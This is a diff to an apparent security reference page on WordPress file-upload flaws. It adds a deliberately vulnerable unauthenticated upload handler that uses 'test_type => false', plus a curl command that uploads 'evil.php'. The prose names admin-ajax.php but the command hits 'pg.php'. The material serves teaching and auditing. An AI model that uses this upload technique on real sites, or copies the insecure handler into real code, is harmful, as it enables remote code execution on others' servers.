@@ -6,6 +6,7 @@ head:
 contributors:
     - rafiem
     - e-psk
+    - dhakalananda
 ---
 
 import { LinkCard } from '@astrojs/starlight/components';
@@ -265,6 +266,50 @@ To bypass the above check we need to prepare and upload a valid `.htaccess` file
 ```
 
 Then, all we need to do to gain RCE is to upload a .php file with the .jpg extension.
+
+### test_type => false
+
+The function `wp_handle_upload()` offers different parameters for users to provide the flexibility on file upload. However, when a wrong option `test_type => false` is used, it can lead to arbitrary file upload since the option disables the filetype and extension check.
+
+Example of vulnerable code:
+
+```php
+add_action( 'wp_ajax_nopriv_upload_image', 'upload_image' );
+
+function upload_image() {
+    if ( empty( $_FILES['file'] ) ) {
+        wp_send_json_error( [ 'message' => 'No file uploaded.' ] );
+    }
+
+    if ( ! function_exists( 'wp_handle_upload' ) ) {
+        require_once ABSPATH . 'wp-admin/includes/file.php';
+    }
+
+    // Handle file upload
+    $upload = wp_handle_upload(
+        $_FILES['file'],
+        [
+            'test_form' => false,
+            'test_type' => false,
+        ]
+    );
+
+    if ( isset( $upload['error'] ) ) {
+        wp_send_json_error( [ 'message' => $upload['error'] ] );
+    }
+
+    // Return successful response with file URL
+    wp_send_json_success( [ 'url' => $upload['url'] ] );
+}
+```
+
+To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the malicious file.
+
+```bash
+curl -X POST -F "file=@evil.php" "http://localhost:8000/pg.php"
+```
+
+Note: The file needs to be present in the directory curl command is being run.
 
 ## Article References
 
